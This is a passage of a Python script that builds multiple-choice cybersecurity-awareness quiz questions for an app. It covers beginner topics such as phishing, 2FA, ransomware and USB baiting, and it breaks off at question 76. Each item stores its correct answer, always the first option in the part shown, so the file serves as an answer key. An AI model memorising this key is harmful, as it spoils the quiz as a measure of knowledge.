"""
Generates 300 unique, high-quality, realistic Cybersecurity & Phishing questions
- 100 Beginner Questions (IDs 1-100): Digital hygiene, scam recognition, basic security habits
- 100 Intermediate Questions (IDs 101-200): Network security, web app vulnerabilities, auth protocols, headers
- 100 Advanced Questions (IDs 201-300): Elite technical scenarios (AiTM, BYOVD kernel exploits, ROP chains, 
  AD Kerberoasting/DCShadow/ADCS, Padding Oracles, SAML XSW, Microarchitectural attacks, Post-Quantum crypto)

Automatic Option Shuffling & Balancing:
- Guarantees exactly 25 A (0), 25 B (1), 25 C (2), 25 D (3) per difficulty level (75 each overall).
- Completely eliminates option position bias.

Saves output to:
- backend/challenge_questions.json
- android_app/app/src/main/assets/challenge_questions.json
"""
import json
import os
import random

def get_raw_beginner_data():
    return [
        (1, "You receive an SMS claiming your bank account will be blocked today unless you click a link to verify your identity. What is the safest action?",
         ["Verify directly through the official bank mobile app or customer care", "Click the link immediately to prevent account suspension", "Reply with your account number and PIN", "Forward the message to your family members"],
         0, "Legitimate banks will never demand immediate action via SMS links with threats of account closure. Always verify through official channels.", "Never click links in unsolicited urgent security alert messages."),

        (2, "Which visual indicator in your web browser confirms an encrypted HTTPS connection?",
         ["A padlock icon and 'https://' prefix in the address bar", "A red exclamation mark next to the URL", "A colorful popup window in the center", "The word 'SECURE' in all capital letters in the webpage title"],
         0, "HTTPS (Hypertext Transfer Protocol Secure) encrypts communication between your browser and the website, represented by a padlock icon.", "Ensure the padlock and correct domain spelling are present before typing sensitive information."),

        (3, "You receive a phone call from an unknown number claiming to be from Microsoft tech support stating your PC has a virus. What scam is this?",
         ["Tech Support Vishing / Remote Access Scam", "DNS Poisoning", "Cross-Site Scripting", "Zero-Day Kernel Exploit"],
         0, "Tech support scammers impersonate major tech companies to trick victims into granting remote access and paying for fake repairs.", "Legitimate companies like Microsoft or Apple will never place unprompted calls about virus infections."),

        (4, "What constitutes a strong and secure password according to cybersecurity standards?",
         ["A combination of at least 12-16 characters including uppercase, lowercase, numbers, and symbols", "Your birthdate and pet's name (e.g., Fluffy1995)", "A sequence of keyboard keys like 'qwerty12345'", "The word 'Password' with an @ sign"],
         0, "Longer passphrases with varied character sets significantly increase entropy, making brute-force and dictionary attacks computationally infeasible.", "Use a password manager to generate and store distinct, complex passwords for every service."),

        (5, "Why is enabling Two-Factor Authentication (2FA) critical for online accounts?",
         ["It requires a second verification factor (like a code or prompt), protecting you even if your password is leaked", "It speeds up website page loading times", "It removes the requirement of having any password", "It encrypts all files on your computer hard drive"],
         0, "2FA provides defense-in-depth: an attacker with your password still cannot log in without the secondary authentication factor.", "Always enable 2FA / MFA on your primary email, banking, and social media accounts."),

        (6, "What is 'Phishing' in cybersecurity?",
         ["A social engineering attack where fraudsters deceive users into revealing sensitive data like passwords or credit cards", "A method of speeding up internet connection", "A hardware component inside computer processors", "An operating system update tool"],
         0, "Phishing relies on psychological manipulation and deceptive messages to steal sensitive credentials and financial data.", "Always scrutinize the sender's actual email address and domain name before interacting with unexpected requests."),

        (7, "You connect your laptop to a free public Wi-Fi network at an airport. What security risk should you be aware of?",
         ["Public Wi-Fi traffic can be intercepted or spoofed by bad actors on the same network", "Your laptop's battery will drain twice as fast", "The airport will automatically delete your installed applications", "Public Wi-Fi permanently changes your computer's MAC address"],
         0, "Unsecured public networks allow attackers on the same network to snoop on unencrypted traffic or stage Man-in-the-Middle attacks.", "Use a trusted Virtual Private Network (VPN) when browsing on public Wi-Fi networks."),

        (8, "An email claims you have won an international lottery worth $1,000,000 that you never entered. It asks for a $50 processing fee. What is this?",
         ["An Advance Fee Fraud / Lottery Scam", "An authentic government grant program", "A legitimate bank cashback refund", "A routine email server validation test"],
         0, "Lottery scams entice victims with nonexistent prizes, requiring advance fees or personal banking details to claim the 'winnings'.", "If you never bought a ticket or entered a contest, you cannot win it. Never send money to claim a prize."),

        (9, "What should you do before plugging an unknown USB flash drive found in a parking lot into your computer?",
         ["Never plug unknown USB drives into your system as they can deploy malicious payloads or keystroke injection", "Plug it in immediately to find out who owns it", "Format it immediately while opening all files", "Plug it into your company server for scanning"],
         0, "Attackers drop malicious USB drives (USB Drop Attack) containing autorun malware or BadUSB microcontrollers to breach target systems.", "Never plug unknown physical drives into your personal or corporate computers."),

        (10, "Why is it important to regularly update your smartphone operating system and apps?",
         ["Updates patch known security vulnerabilities that cybercriminals exploit to hack devices", "Updates only change the app icon colors", "Updates delete old contacts automatically", "Updates prevent websites from showing images"],
         0, "Software updates contain critical security patches that fix vulnerabilities exploited by malware and threat actors.", "Turn on automatic updates for your OS, web browsers, and apps to stay protected against known exploits."),

        (11, "What does OTP stand for, and why should you never share it?",
         ["One-Time Password; sharing it gives attackers direct access to authenticate your transactions or account logins", "Online Transfer Protocol; it is public data", "Official Technology Parameter; it only changes once a year", "Open Terminal Port; used for downloading games"],
         0, "An OTP is a temporary security code meant solely for your eyes to authorize a specific transaction or login.", "No bank, company representative, or support agent will ever ask you to read out your OTP."),

        (12, "You notice an app on the Google Play Store or Apple App Store with only 5 downloads requesting camera, contacts, and SMS permissions for a flashlight app. What should you do?",
         ["Do not download it, as excessive permissions on unknown apps indicate potential spyware or malicious intent", "Download it immediately", "Grant all permissions because it is in an app store", "Disable your phone's screen lock to test it"],
         0, "Malicious apps often request excessive permissions (like SMS/contacts) to steal OTPs, private messages, and contact lists.", "Check app reviews, download counts, developer reputation, and required permissions before installing."),

        (13, "What is malware?",
         ["Malicious software designed to infiltrate, damage, or gain unauthorized access to computer systems", "A high-speed graphics rendering engine", "An internet service provider plan", "A standard keyboard driver"],
         0, "Malware is an umbrella term encompassing viruses, worms, trojans, ransomware, and spyware built to cause harm.", "Run reputable antivirus software and avoid downloading software from unverified sources."),

        (14, "Which of the following email sender addresses is most likely a spoofed phishing attempt mimicking Netflix?",
         ["billing-support@netfIix-security-alert.top", "support@netflix.com", "info@account-update.netflix.com", "help@netflix.com"],
         0, "Phishers use deceptive domains (e.g. .top, .xyz) and typos to impersonate official brands.", "Inspect the domain right after the '@' sign carefully before trusting any billing or account warning."),

        (15, "What is 'Social Engineering' in information security?",
         ["Psychological manipulation of individuals into performing actions or divulging confidential information", "Designing civil infrastructure projects", "Writing computer code in Python", "Building social networking websites"],
         0, "Social engineering targets human vulnerabilities like trust, fear, urgency, or curiosity rather than technical flaws.", "Always verify urgent or emotional requests through independent communication channels."),

        (16, "What is the primary function of a Firewall on your computer or router?",
         ["To monitor and filter incoming and outgoing network traffic based on predetermined security rules", "To clean physical dust from internal hardware fans", "To make your internet download speed infinite", "To back up photos to the cloud automatically"],
         0, "A firewall acts as a protective barrier inspecting packets to block unauthorized access and malicious network intrusions.", "Keep your default operating system firewall enabled at all times."),

        (17, "When creating security questions for account recovery, what is a recommended best practice?",
         ["Use random answers or treat security questions like additional passwords stored in your password manager", "Use answers that can easily be discovered on your public social media profiles (e.g. mother's maiden name, high school)", "Share the answers with friends so they can help you recover", "Use your phone number as every answer"],
         0, "Standard security question answers are often discoverable through social media reconnaissance or public records.", "Treat security answers like second passwords or provide fictitious answers saved in a password manager."),

        (18, "What does 'Smishing' refer to?",
         ["Phishing attacks carried out via SMS / text messaging", "Spam emails sent to corporate mailing lists", "A physical attack on computer keyboards", "Stealing smart watches from lockers"],
         0, "Smishing (SMS Phishing) delivers deceitful links or phone numbers via text messages claiming urgent banking or delivery issues.", "Avoid clicking links in text messages from unknown or unexpected shortcodes and numbers."),

        (19, "You receive a message from a friend on Instagram saying 'Hey, look who died in this video :(' with a suspicious link. What happened?",
         ["Your friend's account was likely compromised and is sending automated phishing/malware links to all contacts", "Your friend is testing your video player", "Instagram officially sent this message", "Your phone has run out of storage space"],
         0, "Compromised social media accounts are frequently automated to blast lure links to contacts to spread credential-stealing pages.", "Contact your friend through a different channel (phone call or SMS) before clicking suspicious links."),

        (20, "What is 'Shoulder Surfing'?",
         ["Directly observing someone's screen or keyboard over their shoulder to steal PINs, passwords, or confidential data", "Surfing the internet using a laptop on your shoulder", "A type of physical exercise for IT technicians", "A Wi-Fi antenna optimization technique"],
         0, "Shoulder surfing involves looking over a target's shoulder in public places like ATMs, coffee shops, or airports to steal passwords.", "Shield your screen and keypad when entering PINs or passwords in public spaces."),

        (21, "Why should you avoid using the same password across multiple online accounts?",
         ["If one website suffers a data breach, attackers will use that password to access all your other accounts (Credential Stuffing)", "Browsers do not support reusing passwords", "Reusing passwords makes your computer run out of RAM", "Websites charge a fine for identical passwords"],
         0, "Password reuse enables credential stuffing attacks where a single leak exposes your entire digital identity.", "Use a password manager to generate unique passwords for every online service."),

        (22, "What is 'Ransomware'?",
         ["Malware that encrypts your files and demands payment in cryptocurrency to provide the decryption key", "Software that makes your internet connection faster for a subscription fee", "An app for managing company payroll records", "A tool for recovering lost documents for free"],
         0, "Ransomware holds user or enterprise data hostage through strong encryption, demanding extortionate ransoms.", "Maintain regular offline backups and keep all software patched to prevent ransomware destruction."),

        (23, "You receive an email from 'Google Security Team' with the subject 'Suspicious Login Detected! Click here to verify within 10 minutes'. The link points to 'http://google-security-verify-login.xyz'. What should you do?",
         ["Do not click the link; it is a phishing attack using urgency and a fake domain to steal Google credentials", "Click immediately and enter your password before the 10 minutes expire", "Reply with your 2FA backup codes", "Forward it to your boss as an urgent update"],
         0, "Legitimate Google security alerts appear directly in your Google Account dashboard, not from third-party .xyz domains with urgent timers.", "Navigate directly to myaccount.google.com/security to check real security events."),

        (24, "What does 'End-to-End Encryption' (E2EE) in messaging apps like WhatsApp or Signal mean?",
         ["Only the sender and recipient can read the messages; not even the service provider can decrypt them", "Messages are encrypted only on weekends", "Anyone on the same Wi-Fi can read the chat history", "Messages are sent unencrypted over standard radio towers"],
         0, "E2EE ensures that cryptographic keys exist solely on the participating endpoints, preserving message privacy.", "Use E2EE platforms for private communications and verify safety numbers/security codes."),

        (25, "What is the danger of clicking on sponsored ads at the very top of search engine results for banking or software downloads?",
         ["Malicious actors purchase search ads targeting brand keywords to direct users to identical phishing clones or trojanized installers (Malvertising)", "Sponsored ads are always 100% verified and risk-free", "Search ads will physically damage your monitor screen", "Clicking search ads resets your browser bookmarks"],
         0, "Malvertisers exploit search engine advertising to rank fake login portals and trojanized installers above organic results.", "Check the URL domain carefully or bookmark official banking and software portals."),

        (26, "Why should you lock your computer screen (Windows Key + L / Command + Control + Q) whenever you step away from your desk?",
         ["To prevent unauthorized individuals from viewing confidential data, sending emails from your account, or plugging malicious USBs", "To allow the computer fan to rest", "To save hard drive storage space", "To speed up Windows updates"],
         0, "Physical security is the first line of defense; an unlocked unattended workstation is vulnerable to immediate compromise in seconds.", "Develop the muscle memory habit of locking your screen every single time you walk away."),

        (27, "What is a 'Trojan Horse' in cybersecurity?",
         ["Malware disguised as legitimate or harmless software to trick users into downloading and installing it", "A wooden toy sold in computer shops", "A hardware processor cooling mechanism", "An official antivirus software package"],
         0, "Trojans masquerade as useful utilities (games, cracked software, PDF readers) while secretly executing malicious payloads.", "Only download software from verified official vendors and app stores."),

        (28, "What does 'Spyware' do on an infected device?",
         ["Secretly monitors user activity, logs keystrokes, steals passwords, and transmits data to attackers without consent", "Cleans up temporary cache files to speed up the OS", "Displays high-definition wallpaper images", "Connects your computer to wireless headphones automatically"],
         0, "Spyware operates stealthily in the background to harvest browsing habits, credentials, audio/video recordings, and keystrokes.", "Use anti-spyware tools and inspect installed programs and browser extensions regularly."),

        (29, "You receive an email from your CEO marked 'URGENT & CONFIDENTIAL' asking you to purchase $500 in Apple Gift Cards immediately for a client meeting. What is this?",
         ["CEO Fraud / Business Email Compromise (BEC)", "A legitimate corporate bonus program", "An official tax deduction procedure", "A hardware procurement test"],
         0, "BEC attacks leverage executive authority, secrecy, and artificial urgency to trick employees into purchasing gift cards or wiring funds.", "Always verify unusual payment or gift card requests via a direct phone call or face-to-face confirmation."),

        (30, "What is the primary risk of using free, cracked, or pirated software downloaded from torrent sites?",
         ["Cracked software frequently contains embedded trojans, cryptominers, or backdoors placed by release groups", "Cracked software takes up less hard drive space", "Cracked software automatically disables your internet provider", "Cracked software improves gaming frame rates safely"],
         0, "Pirated releases are prime vectors for malware distribution because users are instructed to disable antivirus software to run keygens.", "Never run cracked executables or disable security software to install pirated programs."),

        (31, "What is 'Vishing'?",
         ["Voice Phishing - social engineering conducted over phone calls to extract sensitive information", "Video editing software", "Virtual machine management", "Vector graphics design"],
         0, "Vishing combines phone deception, caller ID spoofing, and social pressure to manipulate victims into revealing confidential info.", "Hang up on suspicious callers and call back using the verified number from the official organization website."),

        (32, "Why is it dangerous to accept friend or connection requests from total strangers on social media?",
         ["Strangers may be fake accounts conducting social engineering reconnaissance, gathering personal info for spear phishing, or distributing malicious links", "Social media apps charge a monthly fee for each stranger added", "Stranger requests will crash your phone's operating system", "Adding strangers automatically deletes your existing friends"],
         0, "Threat actors use fake profiles to map your network, learn personal details, and establish trust before launching attacks.", "Keep your social circles private and vet new connection requests carefully."),

        (33, "What is a 'Brute Force Attack' against passwords?",
         ["An automated attack that systematically tries all possible combinations of characters until the correct password is found", "Physically hitting a computer keyboard to enter passwords", "A method for cooling server processors", "An official password recovery feature"],
         0, "Brute force attacks test thousands or millions of password guesses per second using specialized cracking tools and dictionaries.", "Use long passphrases and account lockout mechanisms to defeat brute-force guessing."),

        (34, "What should you do before disposing of or selling an old smartphone or computer?",
         ["Perform a full factory reset and ensure the storage drive is securely erased/wiped", "Simply delete the desktop shortcut icons", "Log out of one app and leave the rest logged in", "Turn off Wi-Fi and sell it immediately"],
         0, "Simply deleting files leaves data recoverable with basic recovery software; factory reset with encryption wiping prevents data leakage.", "Back up your data, sign out of all accounts, and perform a complete cryptographic wipe/factory reset."),

        (35, "What is a 'Password Manager' and why is it recommended?",
         ["An encrypted application that generates, stores, and autofills complex, unique passwords for all your online accounts", "A public spreadsheet shared online with friends", "A sticky note attached to your computer screen", "A browser extension that makes all passwords the word 'admin'"],
         0, "Password managers eliminate the cognitive burden of remembering passwords, enabling complex, 20+ character unique credentials everywhere.", "Adopt a reputable password manager protected by a strong master passphrase and hardware 2FA."),

        (36, "What is 'Pretexting' in social engineering?",
         ["Creating an invented scenario or believable fake identity to manipulate a target into providing confidential data", "Writing text messages using predictive AI", "Testing computer printer paper quality", "Formatting text files in HTML"],
         0, "Pretexting relies on an elaborate false narrative (e.g. auditor, vendor, law enforcement) to establish trust and extract data.", "Always verify the caller or emailer's authority through out-of-band channels."),

        (37, "What is 'Baiting' in cybersecurity social engineering?",
         ["Leaving a malware-infected physical drive (like a USB labeled 'Confidential Payroll') in a public spot to entice curious victims into plugging it in", "Catching fish using specialized digital sensors", "Sending birthday cards to coworkers", "Advertising computer hardware discounts online"],
         0, "Baiting exploits human curiosity and greed by offering free goods or intriguing information loaded with malicious payloads.", "Never insert found media into your computer, regardless of enticing labels."),

        (38, "What does 'Tailgating' or 'Piggybacking' refer to in physical cybersecurity?",
         ["An unauthorized person closely following an authorized person through a secured door without scanning a badge", "Driving too close to another car in a company parking lot", "Connecting two Ethernet cables together", "Attaching multiple monitors to one laptop"],
         0, "Tailgating compromises physical perimeter security by exploiting human politeness to bypass access control doors.", "Never hold open security doors for unbadged individuals; direct visitors to the reception desk."),

        (39, "What is 'Adware'?",
         ["Software that automatically displays or downloads unwanted advertising banners and popups, often tracking user browsing habits", "Software that creates 3D animation advertisements", "A hardware graphics acceleration card", "An operating system tool for managing monitor brightness"],
         0, "Adware clutters systems with intrusive ads, slows browser performance, and frequently bundles tracking telemetry.", "Use reputable ad blockers and avoid downloading bundled free software installers."),

        (40, "What is 'Keylogger' malware?",
         ["Malware that records every single keystroke typed on the keyboard to capture passwords, credit card numbers, and private messages", "A program that plays musical piano keys on your computer", "A tool for fixing broken keyboard keys", "A software driver for ergonomic keyboards"],
         0, "Keyloggers stealthily log keyboard inputs and transmit raw credentials directly to threat actor command servers.", "Use virtual keyboards for sensitive inputs, keep antivirus active, and enforce MFA."),

        (41, "What should you do if your computer suddenly displays a full-screen red warning claiming the FBI locked your PC and demanding $300 in gift cards?",
         ["Recognize it as a tech support / browser locker scam, do not pay, force close the browser (Alt+F4 / Task Manager), and scan with antivirus", "Immediately buy $300 in gift cards and read the codes over the phone", "Mail your computer hard drive to Washington D.C.", "Enter your credit card number into the red popup"],
         0, "Browser lockers create fullscreen scareware pages with synthesized sirens and fake law enforcement badges to extort money.", "Force terminate the browser process, clear browser cache, and run a malware scan."),

        (42, "What is 'Whaling' in phishing terminology?",
         ["A targeted spear phishing attack aimed specifically at high-profile executives, CEOs, or government leaders", "Phishing attacks conducted by maritime vessels at sea", "Sending spam emails to millions of random addresses", "Hacking underwater fiber optic cables"],
         0, "Whaling targets top-level executives whose high authority and access privileges yield high-value financial or data theft.", "Organizations must train C-suite executives and implement dual-authorization controls for large financial transactions."),

        (43, "Why should you avoid using open/unencrypted Wi-Fi hotspots for online banking transactions?",
         ["Traffic on open networks is broadcast in plaintext, allowing nearby attackers to sniff network packets or deploy captive portal clones", "Open Wi-Fi makes your bank account balance decrease automatically", "Banks physically block connections from all laptops", "Open Wi-Fi breaks the encryption chip inside smartphones permanently"],
         0, "Open hotspots lack link-layer encryption, making session interception and rogue access point spoofing trivial.", "Use cellular data (4G/5G) or a trustworthy VPN when performing banking transactions away from home."),

        (44, "What is a 'Botnet'?",
         ["A network of compromised private computers and IoT devices infected with malware and controlled remotely as a group by a botmaster", "A friendly robotic assistant for cleaning home offices", "A high-speed internet cable network", "An online database of computer science textbooks"],
         0, "Botnets are orchestrated to launch massive Distributed Denial of Service (DDoS) attacks, send spam, or mine crypto.", "Secure IoT devices with strong unique passwords and patch router vulnerabilities."),

        (45, "What does 'Quishing' refer to?",
         ["Phishing attacks that embed malicious links inside QR codes to bypass email security filters and trick mobile users", "Sending phishing messages through quick email servers", "A method for scanning barcodes in grocery stores", "Playing quiz games online to win prizes"],
         0, "Quishing conceals malicious URLs inside QR codes; email scanners often fail to parse image content, and mobile scanners lack inspection tools.", "Always preview the destination URL before opening links scanned from QR codes, especially on physical flyers or unsolicited emails."),

        (46, "What is the safest way to verify if an email from 'PayPal' stating 'Your account has been restricted' is authentic?",
         ["Open a new browser tab, manually type 'paypal.com', log in directly, and check the official Resolution Center notifications", "Click the 'Fix Restriction Now' button inside the email", "Reply to the email with your credit card CVV code", "Call the telephone number listed in the email footer"],
         0, "Direct portal navigation ensures you never interact with spoofed links or malicious proxy landing pages.", "Never follow account resolution links embedded in unexpected warning emails."),

        (47, "Why is 'Auto-Fill' of credit card numbers on shared or public computers dangerous?",
         ["Any subsequent user of that computer can make unauthorized purchases or view your saved payment details", "Auto-fill doubles the price of every item purchased", "Auto-fill deletes your banking account permanently", "Auto-fill makes web pages take 10 minutes to render"],
         0, "Shared browsers retain cached autofill forms and cookies, leaving payment credentials exposed to strangers.", "Disable autofill, use private/incognito mode, and sign out completely when on shared workstations."),

        (48, "What is 'DDoS' (Distributed Denial of Service) attack?",
         ["Flooding a target server or website with overwhelming internet traffic from thousands of compromised devices to make it unavailable", "Stealing physical hard drives from a server room", "A method for downloading video files faster", "An official operating system backup process"],
         0, "DDoS attacks exhaust server bandwidth, CPU, or memory resources by generating artificial traffic storms.", "Deploy DDoS mitigation services (e.g., Cloudflare/Akamai) and rate-limiting upstream firewalls."),

        (49, "What should you check in an email before clicking any hyperlink?",
         ["Hover your mouse cursor over the link to preview the actual destination URL without clicking", "Check if the email has a colorful logo", "Check if the email was sent on a Friday", "Check if the font size is 12pt"],
         0, "Link text can display 'www.bank.com' while the underlying href anchor points to 'www.phish-bank.ru'.", "Always hover over hyperlinks to inspect the true destination domain before clicking."),

        (50, "What is 'Zero-Day Vulnerability'?",
         ["A software flaw that is known to attackers or researchers but has zero days of patch availability from the vendor", "A bug that only occurs on the first day of every month", "A computer that has been turned on for zero days", "A software program with zero lines of code"],
         0, "Zero-day flaws carry severe risk because no official fix or patch exists at the time of discovery.", "Apply defense-in-depth, behavioral endpoint monitoring, and virtual patching until official vendor patches release."),

        (51, "What is 'Juice Jacking'?",
         ["A cyber attack where malware is installed or data is secretly stolen from a device via a compromised public USB charging kiosk", "Spilling fruit juice over a computer motherboard", "Overcharging a smartphone battery to increase capacity", "A software tool for downloading music"],
         0, "USB cables transmit both power and data; compromised public charging stations can siphon photos or inject exploits.", "Use USB data blockers ('USB condoms') or standard AC wall outlets when traveling."),

        (52, "Why are 'Security Patches' issued by software vendors?",
         ["To fix newly discovered security vulnerabilities and bugs that could be exploited by threat actors", "To force users to purchase new hardware", "To slow down computer processing speeds", "To delete old user documents"],
         0, "Security patches close security holes discovered by internal security teams or external vulnerability researchers.", "Install security patches promptly to shrink your attack surface."),

        (53, "What is a 'Rootkit'?",
         ["Stealthy malware designed to maintain privileged root/admin access while actively hiding its presence from the OS and security tools", "A toolkit used for planting trees in digital gardens", "A software program for managing computer sound cards", "An external USB keyboard driver"],
         0, "Rootkits subvert operating system kernel APIs to conceal processes, files, and network connections from task managers.", "Use Secure Boot, kernel integrity validation, and offline forensic scanners to detect rootkits."),

        (54, "What is 'Pre-texting' via SMS commonly called?",
         ["Smishing with a social engineering persona", "Voice mail phishing", "Macro scripting", "Packet filtering"],
         0, "Smishing attacks create false personas (delivery drivers, tax authorities, bank fraud managers) to elicit immediate compliance.", "Treat unexpected texts requesting urgent action as untrusted until verified."),

        (55, "What should you do if you suspect you accidentally entered your password on a phishing website?",
         ["Change the password immediately on the real website, terminate all active login sessions, and enable 2FA", "Wait 30 days to see if any strange transactions occur", "Turn off your monitor for 1 hour", "Create a second account with the exact same password"],
         0, "Speed is essential; changing the credential immediately invalidates the stolen password before attackers leverage it.", "Reset the password immediately, revoke all session tokens, and alert your security team."),

        (56, "What is the primary danger of enabling 'Macros' in Microsoft Word or Excel documents received from external emails?",
         ["Macros can contain Visual Basic (VBA) scripts that execute malicious code, download trojans, and compromise your system", "Macros increase the document file size by 100 gigabytes", "Macros permanently convert the document into an audio file", "Macros disable your computer's Bluetooth radio"],
         0, "Malicious macros embedded in Office documents execute shell commands and download initial-access malware loaders.", "Keep macros disabled by default and never enable content on unsolicited attachments."),

        (57, "What is 'Typosquatting' at a basic level?",
         ["Buying misspelled domain names (e.g. g00gle.com, amzon.com) to catch users who make typing mistakes and show them phishing pages", "Typing extremely fast on a mechanical keyboard", "A competition for computer programmers", "An error in printer font formatting"],
         0, "Typosquatters capitalize on human keyboard mistakes to direct victims to counterfeit web portals.", "Bookmark important banking and shopping sites to avoid manual typing errors."),

        (58, "What does 'HTTPS' provide that standard 'HTTP' lacks?",
         ["Encryption of data in transit and cryptographic verification of the server's identity via SSL/TLS certificates", "Free high-speed fiber optic internet access", "Automatic translation of all web pages into 50 languages", "Unlimited cloud storage for uploaded photos"],
         0, "HTTP transmits all data (including passwords) in cleartext; HTTPS encrypts data in transit to prevent sniffing.", "Ensure HTTPS is active on every web page where you enter credentials or personal information."),

        (59, "What is 'Ransomware as a Service' (RaaS)?",
         ["A cybercrime business model where malware developers lease ransomware variants to affiliates in exchange for a percentage of ransom payouts", "A legitimate cloud backup storage service", "An insurance policy that pays computer repair bills", "A free software utility for cleaning hard drives"],
         0, "RaaS democratizes cyber attacks by providing non-technical affiliates with automated exploit tooling and payment portals.", "Defend against RaaS through layered endpoint security, credential hygiene, and immutable backups."),

        (60, "What is 'Credential Stuffing'?",
         ["An automated attack where stolen username/password lists from previous data breaches are tested across hundreds of other websites", "Stuffing physical computer cases with memory modules", "Creating 100 new passwords every single day", "A method for encrypting database tables"],
         0, "Because many users reuse passwords, automated bots test millions of breached credentials across major online portals.", "Use unique passwords for every site to ensure a breach at one service does not compromise others."),

        (61, "What should you do if an unknown person sends you a LinkedIn message offering a $200k remote job and asks you to run a 'test assignment.exe' file?",
         ["Do not run the .exe file; it is likely a remote access trojan (RAT) or info-stealer malware disguised as a hiring assessment", "Run the .exe file immediately to secure the high-paying job", "Disable Windows Defender to let the .exe run faster", "Forward the executable to all your colleagues"],
         0, "Threat actors use fake recruiter personas to deliver malicious loaders disguised as coding tests or PDF job descriptions.", "Never run executable files (.exe, .scr, .bat, .vbs) received from external recruitment contacts."),

        (62, "What is 'Clickjacking'?",
         ["A deceptive technique where transparent layers or invisible buttons are placed over legitimate webpage elements to trick users into clicking unintended links", "Clicking the mouse button 100 times in 5 seconds", "A tool for repairing broken mouse sensors", "An online gaming tournament"],
         0, "Clickjacking overlays malicious invisible iframes so a victim's clicks perform unauthorized actions (e.g., liking a page, transferring money).", "Web developers must implement 'X-Frame-Options: DENY' and Content Security Policy 'frame-ancestors'."),

        (63, "Why should you never post photos of your boarding pass or concert tickets on social media?",
         ["The barcode/QR code on tickets contains your full name, booking reference (PNR), and personal data that criminals can exploit to hijack your booking", "Social media algorithms will automatically ban your account", "The photo will drain your phone's battery", "Ticket barcodes reflect sunlight into phone cameras"],
         0, "Barcodes encode sensitive booking codes (PNR) allowing bad actors to cancel flights, steal frequent flyer miles, or steal identities.", "Never share boarding passes, event tickets, or government ID cards on social media."),

        (64, "What is 'Eavesdropping Attack' (Snooping)?",
         ["Intercepting and listening in on private communications or network traffic without authorization", "Talking loudly in a library", "Recording bird sounds in nature", "Testing microphone volume on laptops"],
         0, "Eavesdropping attacks capture unencrypted passwords, VoIP calls, and confidential messages across shared or compromised networks.", "Use end-to-end encryption and VPNs to safeguard communications against network snooping."),

        (65, "What does 'Sandboxing' mean in cybersecurity?",
         ["An isolated execution environment where untrusted programs or files run safely without the ability to harm the host operating system", "Building physical sandboxes for children in tech parks", "A tool for organizing files on hard drives", "A method for cleaning dust from motherboards"],
         0, "Sandboxes quarantine suspicious files to observe behavior, analyze API calls, and prevent host corruption.", "Ensure web browsers and PDF readers run their sandbox security features at all times."),

        (66, "What is 'Air-Gapping'?",
         ["A security measure that physically isolates a secure computer or network from the internet and all unsecured external networks", "Leaving open windows in server rooms for air circulation", "Using high-speed wireless 5G routers", "Cleaning computer fans with compressed air"],
         0, "Air-gapped networks have no physical or wireless connections to external networks, protecting ultra-critical infrastructure.", "Transferring data to air-gapped systems requires strictly scanned and authorized media."),

        (67, "What is 'Watering Hole Attack'?",
         ["A targeted cyber attack where hackers compromise a legitimate website known to be frequently visited by a specific target group to infect them", "An attack carried out at a company water cooler", "Flooding a server room with water", "Sending spam emails about bottled water"],
         0, "Watering hole attacks infect industry forums or local vendor sites to deliver drive-by downloads to specific target employees.", "Maintain endpoint patching and web browser isolation to neutralize drive-by exploits."),

        (68, "What does 'Patch Management' refer to?",
         ["The systematic process of identifying, acquiring, testing, and installing software updates across an organization's systems", "Sewing company logo patches onto employee uniforms", "Formatting hard drives once a year", "Managing company parking spaces"],
         0, "Robust patch management ensures known vulnerabilities (CVEs) are remediated before threat actors exploit them.", "Implement automated patch scanning and deployment schedules for all operating systems and third-party software."),

        (69, "What is a 'Honeypot' in network defense?",
         ["A decoy computer system deliberately left vulnerable to lure, detect, deflect, and study cyber attackers", "A sweet reward given to employees who pass phishing tests", "A tool for cleaning physical server hardware", "An encrypted USB drive for storing passwords"],
         0, "Honeypots mimic production assets to trap intruders, providing early warning telemetry and intelligence on attacker tactics.", "Deploy internal honeypots to detect unauthorized lateral reconnaissance early."),

        (70, "What is 'Bluesnarfing'?",
         ["The unauthorized access and theft of information (contacts, calendar, messages) from a wireless device through a Bluetooth connection", "Painting a computer case blue", "Listening to blues music on headphones", "An error screen on Windows computers"],
         0, "Bluesnarfing exploits Bluetooth vulnerabilities to siphon data from discoverable devices without user knowledge.", "Set Bluetooth visibility to 'Non-Discoverable' or turn off Bluetooth in crowded public spaces when not in use."),

        (71, "Why should you disable 'Auto-Connect to Open Wi-Fi Networks' on your mobile phone?",
         ["Attackers set up rogue Wi-Fi access points with common names (e.g., 'Free_Airport_WiFi') to automatically lure and intercept your device traffic (Evil Twin)", "Auto-connect uses up all your cellular phone minutes", "Auto-connect deletes your phone's installed apps", "Auto-connect causes phone screens to flicker"],
         0, "Evil Twin rogue access points impersonate known SSID names to trick devices into auto-connecting and exposing in-transit data.", "Turn off 'Auto-Join Unknown Networks' in your mobile wireless settings."),

        (72, "What is 'Data Loss Prevention' (DLP)?",
         ["A security strategy and software toolset designed to detect and prevent sensitive data from leaving the corporate boundary unauthorized", "A tool for restoring deleted video games", "A technique for increasing hard drive speed", "A program for compressing digital photos"],
         0, "DLP inspects endpoint actions, emails, and cloud uploads to block confidential intellectual property or PII exfiltration.", "Configure DLP policies to block unauthorized transfers of customer credit cards and proprietary code."),

        (73, "What is 'Privilege Escalation' in a cyber attack?",
         ["An attacker exploiting a bug or misconfiguration to gain elevated rights (e.g. Administrator or Root) from a low-privilege user account", "Promoting an employee to team manager", "Upgrading an internet connection from 100Mbps to 1Gbps", "Buying a more expensive computer monitor"],
         0, "Attackers leverage privilege escalation vulnerabilities (e.g. kernel exploits, misconfigured service permissions) to seize full system control.", "Enforce Principle of Least Privilege and restrict local administrator permissions across all endpoints."),

        (74, "What is 'Rogue Access Point'?",
         ["An unauthorized wireless access point installed on a network without administrator consent, creating a backdoor for attackers", "A broken Wi-Fi router that cannot turn on", "An official company router with 4 antennas", "A wireless mouse that lost connection"],
         0, "Rogue access points bypass perimeter firewalls and network segmentation, granting attackers direct unauthorized intranet access.", "Perform periodic wireless surveys and deploy Wireless Intrusion Prevention Systems (WIPS)."),

        (75, "What is 'Data Exfiltration'?",
         ["The unauthorized transfer or theft of sensitive corporate or personal data from a computer system by a cybercriminal", "Backing up documents to an authorized external hard drive", "Deleting temporary files from the recycle bin", "Encrypting files for safe storage"],
         0, "Exfiltration is the final phase of data breaches where stolen data is funneled through covert channels to attacker servers.", "Monitor egress traffic volume and block unauthorized cloud storage and file sharing domains."),

        (76, "What is 'Doxxing'?",
